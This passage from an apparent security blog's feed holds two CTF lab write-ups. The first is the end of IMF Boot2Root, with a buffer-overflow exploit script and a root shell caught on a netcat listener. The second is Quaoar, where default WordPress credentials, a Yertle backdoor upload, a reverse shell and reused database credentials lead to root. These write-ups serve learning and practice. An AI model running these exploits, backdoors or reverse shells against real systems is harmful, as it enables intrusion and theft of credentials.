</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xc9</span>\<span class="n">x38</span>\<span class="n">xc4</span>\<span class="n">xe3</span>\<span class="n">x02</span>\<span class="n">xda</span>\<span class="n">x7d</span>\<span class="n">x75</span>\<span class="n">xbf</span>\<span class="n">x48</span>\<span class="n">x2d</span>\<span class="n">x0c</span>\<span class="n">xa1</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xdc</span>\<span class="n">xda</span>\<span class="n">xc3</span>\<span class="n">xa2</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">offset</span> <span class="o">=</span> <span class="mi">168</span>
</span><span class='line'><span class="n">call</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x63</span>\<span class="n">x85</span>\<span class="n">x04</span>\<span class="n">x08</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">nop</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x90</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">pad</span> <span class="o">=</span> <span class="n">nop</span> <span class="o">*</span> <span class="p">(</span><span class="n">offset</span> <span class="o">&amp;</span><span class="n">ndash</span><span class="p">;</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">))</span> <span class="c"># 73 bytes&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">buf</span> <span class="o">+=</span> <span class="n">pad</span>
</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="n">call</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">agentid</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">menu</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="o">+&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span>
</span><span class='line'><span class="k">print</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Payload</span> <span class="n">sent</span><span class="o">.</span> <span class="n">Check</span> <span class="n">your</span> <span class="n">listener</span><span class="o">.&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>And what remains is to execute it:</p>

<p><code>
root@kali:~# python agentkill.py
Payload sent. Check your listener.
</code></p>

<p>And on the listener, mission accomplished!</p>

<p>```
nc -vnlp 8888
listening on [any] 8888 &hellip;
connect to [192.168.145.129] from (UNKNOWN) [192.168.145.130] 58634
whoami
root
ls /root
Flag.txt
TheEnd.txt
cat Flag.txt
flag6{R2gwc3RQcm90MGMwbHM=}
cat TheEnd.txt</p>

<hr />

<p>  /  <em>/</em> _  <strong><em>  </em></strong>  <strong><em> </em></strong> (<em>) /  / /__
 </em>/ //  &lsquo; \/ _ \/ _ (<em>&ndash;&lt;(</em>&ndash;&lt;/ / _ \/ / &ndash;<em>)
/</em><strong>/<em>/</em>/_/ .</strong>/_<strong>/</strong><em>/</em><strong>/<em>/</em>.</strong>/<em>/_</em>/
   <strong>  </strong>/<em>/        _                    <br/>
  /  |/  (</em>)<strong> </strong><em> (</em>)<strong>  </strong><em>            <br/>
 / /|</em>/ / (<em>&ndash;&lt;(</em>&ndash;&lt;/ / _ \/ _ \           <br/>
/<em>/__/</em>/<em>/</em><strong>/</strong><em>/</em>/_<strong>/<em>//</em>/           <br/>
  / </strong>/<strong>  </strong><strong><em><em><strong><strong><em>                   <br/>
 / </em>// _ \/ </strong>/ </strong>/ &ndash;</em>)                  <br/>
/</em>/  _</strong>/<em>/  _</em>/__/</p>

<p>Congratulations on finishing the IMF Boot2Root CTF. I hope you enjoyed it.
Thank you for trying this challenge and please send any feedback.</p>

<p>Geckom
Twitter: @g3ck0ma
Email: <a href="&#x6d;&#97;&#x69;&#x6c;&#116;&#111;&#x3a;&#103;&#101;&#99;&#107;&#111;&#109;&#x40;&#114;&#101;&#x64;&#x74;&#x65;&#x61;&#x6d;&#114;&#46;&#99;&#x6f;&#x6d;">&#x67;&#x65;&#99;&#x6b;&#x6f;&#x6d;&#x40;&#114;&#101;&#x64;&#116;&#x65;&#x61;&#109;&#x72;&#x2e;&#99;&#111;&#x6d;</a>
Web: <a href="http://redteamr.com">http://redteamr.com</a></p>

<p>Special Thanks
Binary Advice: OJ (@TheColonial) and Justin Stevens (@justinsteven)
Web Advice: Menztrual (@menztrual)
Testers: dook (@dooktwit), Menztrual (@menztrual), llid3nlq and OJ(@TheColonial)
```</p>

<p>And the final decoded flag is <code>Gh0stProt0c0ls</code>! This was a really nice challenge in the later stages, especially from flag 3 onwards! Hats off to Geckom and the collaborators for this interesting VM!</p>

<p>As a recap, from only a web server available to root:</p>

<ul>
<li>HTML source &ndash;> JS included files &ndash;> PHP function exploitation &ndash;> SQLi &ndash;> directory bruteforcing &ndash;> PHP shell upload &ndash;> binary exploitation &ndash;> root</li>
</ul>


<p>```</p>

<hr />

<p>/ It is by the fortune of God that, in   \
| this country, we have three benefits:  |
| freedom of speech, freedom of thought, |
| and the wisdom never to use either.    |
|                                        |
\ &mdash; Mark Twain                          /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hackfest 2016: Quaoar]]></title>
    <link href="http://chousensha.github.io/blog/2018/09/21/hackfest-2016-quaoar/"/>
    <updated>2018-09-21T10:37:53-04:00</updated>
    <id>http://chousensha.github.io/blog/2018/09/21/hackfest-2016-quaoar</id>
    <content type="html"><![CDATA[<p>Today&rsquo;s target was created for the Hackfest 2016 CTF. The goal is to become root and get a flag on the machine.</p>

<!-- more -->


<p>Nmap shows SSH, Samba, a web server and mail services running on the target:</p>

<p><code>
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 d0:0a:61:d5:d0:3a:38:c2:67:c3:c3:42:8f:ae:ab:e5 (DSA)
|   2048 bc:e0:3b:ef:97:99:9a:8b:9e:96:cf:02:cd:f1:5e:dc (RSA)
|_  256 8c:73:46:83:98:8f:0d:f7:f5:c8:e4:58:68:0f:80:75 (ECDSA)
53/tcp  open  domain      ISC BIND 9.8.1-P1
| dns-nsid:
|_  bind.version: 9.8.1-P1
80/tcp  open  http        Apache httpd 2.2.22 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_Hackers
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: RESP-CODES SASL STLS CAPA UIDL PIPELINING TOP
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Not valid before: 2016-10-07T04:32:43
|_Not valid after:  2026-10-07T04:32:43
|_ssl-date: 2018-09-21T14:42:41+00:00; 0s from scanner time.
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: post-login have more capabilities Pre-login LOGINDISABLEDA0001 LITERAL+ listed ENABLE OK LOGIN-REFERRALS ID STARTTLS IMAP4rev1 IDLE SASL-IR
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Not valid before: 2016-10-07T04:32:43
|_Not valid after:  2026-10-07T04:32:43
|_ssl-date: 2018-09-21T14:42:41+00:00; 0s from scanner time.
445/tcp open  netbios-ssn Samba smbd 3.6.3 (workgroup: WORKGROUP)
993/tcp open  ssl/imap    Dovecot imapd
|_imap-capabilities: post-login more capabilities Pre-login have LITERAL+ listed ENABLE OK LOGIN-REFERRALS ID AUTH=PLAINA0001 IMAP4rev1 IDLE SASL-IR
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Not valid before: 2016-10-07T04:32:43
|_Not valid after:  2026-10-07T04:32:43
|_ssl-date: 2018-09-21T14:42:41+00:00; +1s from scanner time.
995/tcp open  ssl/pop3    Dovecot pop3d
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Not valid before: 2016-10-07T04:32:43
|_Not valid after:  2026-10-07T04:32:43
|_ssl-date: 2018-09-21T14:42:40+00:00; +1s from scanner time.
</code></p>

<p>On the web server there are some pictures with planets and the message &ldquo;Hack The Planet&rdquo;. But there are entries in robots.txt:</p>

<p>```
Disallow: Hackers
Allow: /wordpress/</p>

<hr />

<h1>/<em><strong> _   _  </strong> _  </em><strong>   </strong> _ _ __</h1>

<h1>//  / / | | |/ _<code>|/ _ \ / _</code> | &lsquo;__|</h1>

<h1>/ _/ /| |<em>| | (</em>| | (<em>) | (</em>| | |</h1>

<h1>_<strong>,<em>\ _</em>,<em>|_</em>,_|_</strong>/ _<em>,</em>|_|</h1>

<p>```</p>

<p>No directory called hackers but there is a Wordpress blog :p</p>

<p><img class="center" src="/images/pentest/quaoar/quaoar_blog.png" title="&lsquo;wordpress&rsquo; &lsquo;wordpress blog&rsquo;" ></p>

<p>Naturally, I ran Wpscan, and it found 2 usernames:</p>

<p>```
[+] Enumerating usernames &hellip;
[+] We identified the following 2 users:</p>

<pre><code>+----+--------+--------+
| ID | Login  | Name   |
+----+--------+--------+
| 1  | admin  | admin  |
| 2  | wpuser | wpuser |
+----+--------+--------+
</code></pre>

<p>```</p>

<p>A prelimiary check for default credentials actually revealed the password for the admin user is..you will never guess it..admin! For receiving a shell, I wanted to try a new tool: <a href="https://github.com/n00py/WPForce">WPForce</a>!</p>

<blockquote><p>WPForce is a suite of Wordpress Attack tools. Currently this contains 2 scripts &ndash; WPForce, which
brute forces logins via the API, and Yertle, which uploads shells once admin credentials have been
found. Yertle also contains a number of post exploitation modules.</p></blockquote>

<p>I used the <code>yertle.py</code> script to upload a backdoor:</p>

<p>```
python yertle.py -u &ldquo;admin&rdquo; -p &ldquo;admin&rdquo; -t &ldquo;<a href="http://192.168.217.145/wordpress">http://192.168.217.145/wordpress</a>&rdquo; -i</p>

<pre><code> _..---.--.    __   __        _   _
</code></pre>

<p>   .&lsquo;\ <strong>|/O.</strong>)   \ \ / /<strong> _ </strong>| |<em>| | </em><strong>
  /</strong>.&rsquo; <em>/ .&ndash;&lsquo;</em>\    \ V / _ \ &rsquo;<strong>| </strong>| |/ _ .
 (<strong><em><em>.&lsquo;.&ndash;</em>_</em></strong>)    | |  <strong>/ |  | |_| |  </strong>/
  (<em>/ </em>)<strong>(<em> _)_   |</em>|_</strong>|<em>|   _</em>|<em>|___|
   (</em>..)&mdash;(.._)&rsquo;&mdash;&lsquo;         ~n00py~</p>

<pre><code>  Post-exploitation Module for Wordpress
                 v.1.1.0
</code></pre>

<p>Backdoor uploaded!
Upload Directory: cpucqjc
os-shell> whoami
Sent command: whoami
www-data
os-shell> pwd
Sent command: pwd
/var/www/wordpress/wp-content/plugins/cpucqjc
```</p>

<p>Time to snoop around! I was able to read <code>/var/www/wordpress/wp-config.php</code> and inside found credentials for the SQL database:</p>

<p>```
/<em>* MySQL database username </em>/
define(&lsquo;DB_USER&rsquo;, &lsquo;root&rsquo;);</p>

<p>/<em>* MySQL database password </em>/
define(&lsquo;DB_PASSWORD&rsquo;, &lsquo;rootpassword!&rsquo;);
```</p>

<p>I also found a flag inside <em>wpadmin</em>&rsquo;s home directory:</p>

<p><code>
os-shell&gt; cat /home/wpadmin/flag.txt
Sent command: cat /home/wpadmin/flag.txt
2bafe61f03117ac66a73c3c514de796e
</code></p>

<p>I found the shell I had pretty restrictive so I used Yertle to get a reverse shell that I could upgrade:</p>

<p><code>
os-shell&gt; shell
IP Address: 192.168.217.132
Port: 8888
Sending reverse shell to 192.168.217.132 port 8888
</code></p>

<p>And on my listener side:</p>

<p><code>
nc -lnvp 8888
listening on [any] 8888 ...
connect to [192.168.217.132] from (UNKNOWN) [192.168.217.145] 50713
bash: no job control in this shell
www-data@Quaoar:/var/www/wordpress/wp-content/plugins/cpucqjc$
</code></p>

<p>I used Python to spawn a TTY and then I tried the root credentials for a pleasant surprise. They are the actual credentials of the root user!</p>

<p><code>
root@Quaoar:~# cat /root/flag.txt
8e3f9ec016e3598c5eec11fd3d73f6fb
</code></p>

<p>And that was it for this challenge!</p>

<p>```</p>

<hr />

<p>/ Be cheerful while you are alive. \
|                                  |
\ &mdash; Phathotep, 24th Century B.C.  /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
</feed>
